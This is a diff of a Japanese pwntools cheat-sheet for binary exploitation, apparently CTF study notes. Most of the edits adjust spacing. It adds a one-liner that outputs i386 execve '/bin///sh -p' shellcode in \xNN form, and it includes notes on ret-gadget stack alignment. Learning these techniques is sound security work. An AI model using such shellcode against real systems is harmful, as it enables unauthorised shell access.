@@ -45,7 +45,7 @@ print(payload)
 
 ### shellcraft
 
-64ビットの場合、amd64.linux.execve
+64 ビットの場合、amd64.linux.execve
 
 ```shell
 # シェルコードのアセンブラ出力
@@ -53,6 +53,9 @@ pwn shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
 
 # シェルコードのバイトコード出力
 pwn shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
+
+# \xNN の形に統一
+pwn shellcraft i386.linux.execve "/bin///sh" "['sh','-p']" -f s | python3 -c "import sys; from codecs import decode; s=sys.stdin.read().strip()[2:-1]; print(''.join(f'\\x{b:02x}' for b in decode(s, 'unicode_escape')))"
 ```
 
 ```shell
@@ -146,11 +149,11 @@ connect.interactive()
 
 上記の例で、binary と 2 か所の context は、コメントアウトしても機能する。
 
-### retガジェット
+### ret ガジェット
 
-64ビットOSで、RSPが16バイト境界にない場合、retガジェットが必要になる。
+64 ビット OS で、RSP が 16 バイト境界にない場合、ret ガジェットが必要になる。
 
-RSP  0x7fffffffdcf8　のように、末尾が0出ない場合ずれている。
+RSP 0x7fffffffdcf8 　のように、末尾が 0 出ない場合ずれている。
 
 ```python
 from pwn import *
